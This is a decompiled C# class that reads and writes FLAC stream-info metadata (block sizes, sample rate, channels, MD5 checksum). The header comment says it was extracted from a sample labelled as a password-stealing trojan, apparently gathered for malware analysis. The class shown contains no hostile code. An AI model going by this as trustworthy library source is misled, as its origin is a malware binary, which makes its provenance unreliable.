// Decompiled with JetBrains decompiler
// Type: flac.Format.MetadataBlockStreamInfo
// Assembly: STAThreadAttrib, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6EE3DE1A-E148-4FBA-A193-65BEA1824C00
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f6a784c2aa30ddaf03919958455d18bf51533a475c21a73eff578df0174cc5d4.exe

namespace flac.Format
{
  public class MetadataBlockStreamInfo : MetadataBlock
  {
    private const int MIN_BLOCK_SIZE = 16;
    private const int MAX_BLOCK_SIZE = 65535;
    private const int FRAME_SIZE_BITS_COUNT = 24;
    private const int SAMPLE_RATE_BITS_COUNT = 20;
    private const int CHANNELS_BITS_COUNT = 3;
    private const int BPS_BITS_COUNT = 5;
    private const int TOTAL_SAMPLES_BITS_COUNT = 36;
    private ushort minBlockSizeInSamples_;
    private ushort maxBlockSizeInSamples_;
    private int minFrameSizeInBytes_;
    private int maxFrameSizeInBytes_;
    private int sampleRateInHz_;
    private sbyte channelsMinusOne_;
    private sbyte bitsPerSampleMinusOne_;
    private long totalSamplesInStream_;
    private uint[] md5Signature_ = new uint[4];

    public int BitsPerSample => (int) this.bitsPerSampleMinusOne_ + 1;

    public int MinBlockSize
    {
      get => (int) this.minBlockSizeInSamples_;
      set => this.minBlockSizeInSamples_ = (ushort) value;
    }

    public int MaxBlockSize
    {
      get => (int) this.maxBlockSizeInSamples_;
      set => this.maxBlockSizeInSamples_ = (ushort) value;
    }

    public int MinFrameSize
    {
      set => this.minFrameSizeInBytes_ = value;
    }

    public int MaxFrameSize
    {
      set => this.maxFrameSizeInBytes_ = value;
    }

    public int Channels => (int) this.channelsMinusOne_ + 1;

    public long TotalSamples
    {
      set => this.totalSamplesInStream_ = value;
    }

    public uint[] Checksum => this.md5Signature_;

    public MetadataBlockStreamInfo(MetadataBlockHeader header)
      : base(header)
    {
    }

    public override void Read(FlacStream stream)
    {
      this.minBlockSizeInSamples_ = stream.Reader.ReadUShort();
      this.maxBlockSizeInSamples_ = stream.Reader.ReadUShort();
      Validation.IsValid(this.minBlockSizeInSamples_ >= (ushort) 16 && this.minBlockSizeInSamples_ <= ushort.MaxValue);
      Validation.IsValid(this.maxBlockSizeInSamples_ >= (ushort) 16 && this.maxBlockSizeInSamples_ <= ushort.MaxValue);
      this.minFrameSizeInBytes_ = stream.Reader.ReadBitsAsInt(24);
      this.maxFrameSizeInBytes_ = stream.Reader.ReadBitsAsInt(24);
      this.sampleRateInHz_ = stream.Reader.ReadBitsAsInt(20);
      this.channelsMinusOne_ = stream.Reader.ReadBitsAsSByte(3);
      this.bitsPerSampleMinusOne_ = stream.Reader.ReadBitsAsSByte(5);
      this.totalSamplesInStream_ = stream.Reader.ReadBitsAsLong(36);
      this.md5Signature_[0] = stream.Reader.ReadUInt();
      this.md5Signature_[1] = stream.Reader.ReadUInt();
      this.md5Signature_[2] = stream.Reader.ReadUInt();
      this.md5Signature_[3] = stream.Reader.ReadUInt();
    }

    public override void Write(FlacStream stream)
    {
      this.Header.Write(stream);
      stream.Writer.WriteUShort(this.minBlockSizeInSamples_);
      stream.Writer.WriteUShort(this.maxBlockSizeInSamples_);
      stream.Writer.WriteBits(this.minFrameSizeInBytes_, 24);
      stream.Writer.WriteBits(this.maxFrameSizeInBytes_, 24);
      stream.Writer.WriteBits(this.sampleRateInHz_, 20);
      stream.Writer.WriteBits((int) this.channelsMinusOne_, 3);
      stream.Writer.WriteBits((int) this.bitsPerSampleMinusOne_, 5);
      stream.Writer.WriteBitsAsLong(this.totalSamplesInStream_, 36);
      stream.Writer.WriteUInt(this.md5Signature_[0]);
      stream.Writer.WriteUInt(this.md5Signature_[1]);
      stream.Writer.WriteUInt(this.md5Signature_[2]);
      stream.Writer.WriteUInt(this.md5Signature_[3]);
    }
  }
}
